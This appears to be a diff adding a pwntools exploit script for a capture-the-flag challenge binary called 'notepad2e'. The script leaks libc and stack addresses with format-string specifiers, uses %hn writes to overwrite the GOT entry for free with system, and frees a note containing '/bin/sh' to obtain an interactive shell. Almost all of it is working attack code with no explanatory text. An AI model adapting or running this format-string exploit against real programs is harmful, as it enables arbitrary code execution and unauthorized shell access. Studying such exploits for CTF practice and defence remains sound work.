@@ -1,0 +1,97 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./notepad2e")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-linux-x86-64.so.2")
+# context.log_level='debug'
+# p = remote("notepad.ctf.intigriti.io", 1342)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+# p.recvuntil("gift: ")
+# addr = int(p.recvuntil("\n"),16)
+# log.info(f"{hex(addr) = }")
+def create(idx,data):
+    sla(">","1")
+    sla(">",str(idx))
+    sla(">",data)
+def view(idx):
+    sla(">","2")
+    sla(">",str(idx))
+def free(idx):
+    sla(">","3")
+    sla(">",str(idx))
+def write(target,got,val):
+    pack = [val&0xffff,val>>16&0xffff,val>>32&0xffff]
+    for i in range(3):
+        create(1,f"%{target&0xffff}c%{0x1d}$hn")
+        view(1)
+        create(2,f"%{(got+i*2)&0xffff}c%{47}$hn")
+        view(2)
+        create(3,f"%{pack[i]&0xffff}c%{39}$hn")
+        view(3)
+        free(1)
+        free(2)
+        free(3)
+
+    
+    
+# gdbs()
+create(0,"%33$plmao%8$p")
+view(0)
+recv  = p.recvline().split(b"lmao")
+addr = int(recv[0],16)
+addr2 = int(recv[1],16)
+stack = addr2
+libc.address =  addr - 164361
+log.info(f"{hex(addr) = }")
+log.info(f"{hex(libc.address) = }")
+log.info(f"{hex(stack) = }")
+target = stack + 0xd8
+log.info(f"{hex(target) = }")
+free(0)
+# gdbs()
+# write(target,exe.got.setvbuf,libc.sym.system)
+# gdbs()
+# write(target,exe.got.free,libc.sym.system)
+create(1,f"%{target&0xffff}c%{0x1d}$hn")
+view(1)
+create(2,f"%{exe.got.free&0xffff}c%{47}$hn")
+view(2)
+create(3,f"%{libc.sym.system&0xffff}c%{39}$hn")
+view(3)
+create(4,f"%{target&0xffff}c%{0x1d}$hn")
+view(4)
+create(5,f"%{(exe.got.free+2)&0xffff}c%{47}$hn")
+view(5)
+create(6,f"%{libc.sym.system>>16&0xffff}c%{39}$hn")
+view(6)
+create(7,f"/bin/sh\0")
+free(7)
+# key = addr +2100914
+# free(0)
+# free(0)
+# create(1,"aaaaaaaa")
+# create(2,p64(0xCAFEBABE))
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
